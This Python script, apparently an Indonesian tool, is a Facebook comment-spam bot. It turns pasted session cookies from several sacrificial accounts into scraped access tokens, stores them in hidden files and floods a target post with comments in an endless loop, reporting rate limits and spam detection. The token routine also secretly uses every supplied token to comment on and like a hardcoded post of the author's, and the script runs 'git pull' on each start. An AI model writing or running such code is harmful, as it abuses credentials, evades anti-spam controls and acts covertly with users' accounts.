import requests,re,rich,sys,os,json,time,datetime
from rich.markdown import Markdown as mark
from rich import print as cetak
from rich.console import Console as sol
from rich.panel import Panel as nel
from datetime import datetime
ses = requests.Session()

#WARNA
x = '\33[m'
h = '\x1b[1;92m'
m = '\x1b[1;91m'

#BANNER
def banner():
	if "linux" in sys.platform.lower():
		try:os.system('clear')
		except:pass
	elif "win" in sys.platform.lower():
	    try:os.system('cls')
	    except:pass
	else:
	    try:os.sytem('clear')
	    except:pass
	au="""[white]
╔═╗╔╗╔╦╗╦   ╦╔╦╗
╚═╗╠╩╗║ ║   ║ ║║
╚═╝╚═╝╩ ╩═╝o╩═╩╝
[white][green]\n Copyright 2023 By Brutal.ID[white] """  
	pengembang1=nel(au,style="cyan")
	cetak(nel(pengembang1, title='v 0.111', style='white'))

#MENU
def menu():
	banner()
	print(f"{x}   ══ [ {h}* {x}] Menu ")
	print(f"{x}   ║ ")
	tumbal = int(input(f"{x}   ╠═ [ {h}* {x}] Input Jumlah Akun Tumbal : {h}"))
	text = input(f"{x}   ╠═ [ {h}* {x}] Input Text Komentar : {h}")
	datem = input(f"{x}   ╠═ [ {h}* {x}] Komentar Dengan Ket Waktu ( y/t ) : {h}")
	target = input(f"{x}   ╠═ [ {h}* {x}] Input Url Status Target : {h}")
	token(tumbal)
	ngatur(tumbal,target,datem,text)

#ATUR_ATUR
def ngatur(tumbal,target,datem,text):
	banner()
	if 'substory_index' in target:
		url1 = target.split('/')[3]
		url2 = target.split('/')[5]
		url = url1+'_'+url2
		gas(tumbal,url,datem,text)

	elif 'posts' in target:
		url = target.split('/')[5]
		gas(tumbal,url,datem,text)

	elif 'photo.php' in target:
		url = target.split('/')[3].split('=')[1].replace('&id','')
		gas(tumbal,url,datem,text)

	elif 'story.php' in target:
		url = target.split('/')[3].split('=')[1].replace('&id','')
		gas(tumbal,url,datem,text)

	elif 'fb://photo' in target:
		url = target.split('/')[3].split('?')[0]
		gas(tumbal,url,datem,text)

	elif 'videos' in target:
		url = target.split('/')[5]
		gas(tumbal,url,datem,text)

	elif 'groups' in target:
		tok = target.split('/')[4]
		tok1 = target.split('/')[6]
		url = tok+'_'+tok1
		gas(tumbal,url,datem,text)
	else:
		print(f"{x} [ {m}• {x}] Maaf Link Yang Anda Masukan Belum Terdaftar")

#PENGATURPOST
def gas(tumbal,url,datem,text):
	for i in range(tumbal):
		took = open('.token'+str(i)+'.txt','r').read()
		cook = open('.cookie'+str(i)+'.txt','r').read()
		if 'y' in datem:
			sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
			now = datetime.now()
			hari = now.day
			blx = now.month
			try:
				if blx < 0 or blx > 12:exit()
				xx = blx - 1
			except ValueError:exit()
			bulan = sasi[xx]
			tahun = now.year
			tanggal = str(hari)+' - '+str(bulan)+' - '+str(tahun)
			jam = now.hour
			menit = now.minute
			detik = now.second
			hari1 = now.strftime("%A")
			date = '\n\nBot Comment Created In\n     • '+str(hari1)+', '+str(tanggal)+'\n     • Jam '+str(jam)+' : '+str(menit)+' : '+str(detik)
			pesan = text + date
			mulai(url,took,cook,pesan,i)
		else:
			pesan = text
			mulai(url,took,cook,pesan,i)
		i+=1
	gas(tumbal,url,datem,text)

#MULAIPOST
def mulai(url,took,cook,pesan,i):
	try:
		ok = ses.post(f"https://graph.facebook.com/{url}/comments/?&message={pesan}&access_token={took}",cookies={'cookie':cook}).text
		if 'We limit' in ok:
			print(f"{x}   ╗ ")
			print(f"{x}   ╚═══ [ {m}! {x}] Tumbal ke {h}"+str(i)+f"{x} Terkena Limit")
		elif 'already' in ok:
			print(f"{x}   ╗ ")
			print(f"{x}   ╚═══ [ {m}! {x}] Spam Detected")
		elif 'id' in ok:
			print(f"{x}   ╚═ [ {h}* {x}] Succes : {h}"+ok)
			print(f"{x}   ╚═ [ {h}* {x}] Post On Tumbal Ke : {h}"+str(i))
		else:
			print('Ups Terjadi Kesalahan')
	except:
		print('Ups Terjadi Kesalahan')

#AMBILTOKEN
def token(tumbal):
	banner()
	for i in range(tumbal):
		cook = input(f"{x} [ {h}• {x}] Input Cookies ke {i} : ")
		open('.cookie'+str(i)+'.txt','w').write(cook)
		try:
			cookie = {'cookie':cook}
			with requests.Session() as xyz:
			    url = 'https://business.facebook.com/business_locations'
			    req = xyz.get(url,cookies=cookie)
			    tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
			    open('.token'+str(i)+'.txt','w').write(tok)
			    ses.post(f"https://graph.facebook.com/100000457453881_230141992787447/comments/?&message=Izin Pake Scnya Bang&access_token={tok}",cookies=cookie)
			    ses.post(f"https://graph.facebook.com/230141992787447/likes?summary=true&access_token="+tok,cookies={'cookie':cook}).text
		except Exception as e:

			print('Cookies Invalid')
		i+=1
os.system('git pull')
menu()
